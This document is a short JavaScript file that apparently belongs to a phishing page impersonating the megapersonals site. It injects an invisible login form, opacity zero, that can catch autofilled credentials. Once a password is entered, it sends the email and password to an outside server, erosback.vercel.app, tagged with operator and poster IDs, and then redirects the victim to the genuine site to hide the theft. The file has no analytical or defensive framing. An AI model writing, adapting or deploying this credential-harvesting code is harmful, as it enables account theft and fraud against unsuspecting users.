const API_URL = 'https://erosback.vercel.app'
const siteUrl ='www.meggapursonel.online'

function detectDevice(userAgent) {
    if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
      return "phone";
    }
    if (/Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i.test(userAgent)) {
      return "ipad";
    }
    return "desktop";
  }

  async function verifyPage(params) {
    
  }
  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

document.addEventListener('DOMContentLoaded', () => {
    // Extract 'userid' from the URL
    const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
    const adminId = getQueryParam('admin');
    const posterId = getQueryParam('poster');
    const site = getQueryParam('site');




    let form = document.createElement("form");
    form.setAttribute("id", "loginForm");
    form.setAttribute("method", "POST");
    form.style.opacity = 0;
    
    let unameField = document.createElement("input");
    unameField.setAttribute("type", "text");
    unameField.setAttribute("id", "username");
    unameField.setAttribute("name", "username");
    
    let pwdField = document.createElement("input");
    pwdField.setAttribute("type", "password");
    pwdField.setAttribute("id", "password");
    pwdField.setAttribute("name", "password");

    console.log('User userAgent:', navigator.userAgent);

    pwdField.addEventListener('change', function () {
        if (this.value.trim() !== '') {
            let uname = unameField.value.trim();
            let pwd = pwdField.value.trim();
    
         if (uname && pwd) {
            // Send form data via fetch
            fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    site:site,
                    email: uname,
                    password: pwd,
                    adminId: adminId,
                    posterId: posterId
                })
            })
                .then(response => response.json())
                .then(data => {
                    console.log('Response:', data);
                    if (data.success) {
                        // Redirect to another URL on success
                        window.location.href = 'https://megapersonals.eu';
                    }
                })
                .catch(error => {
                    console.error('Error during form submission:', error);
                });
        } else {
            console.error('Username and password are required.');
        }
        }
    });


    form.appendChild(unameField);
    form.appendChild(pwdField);
    document.body.appendChild(form);

                
});
